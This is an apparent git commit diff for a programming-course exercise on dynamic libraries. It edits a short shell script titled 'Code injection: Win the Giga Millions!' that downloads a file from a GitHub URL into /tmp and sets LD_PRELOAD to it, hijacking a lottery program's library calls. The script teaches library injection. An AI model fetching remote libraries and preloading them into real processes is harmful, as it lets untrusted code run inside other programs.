8eb492f6c7a151b211f272b2ae4c54206215748b
makau <makauwanyoike@gmail.com>
2024-09-23 16:44:05 +0300

    Code injection: Win the Giga Millions!

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -O /tmp/libmask.so https://github.com/ShagizMan/alx-low_level_programming/blob/master/0x18-dynamic_libraries/gm
+wget -O /tmp/gm https://github.com/ShagizMan/alx-low_level_programming/blob/master/0x18-dynamic_libraries/gm
 export LD_PRELOAD=/tmp/gm
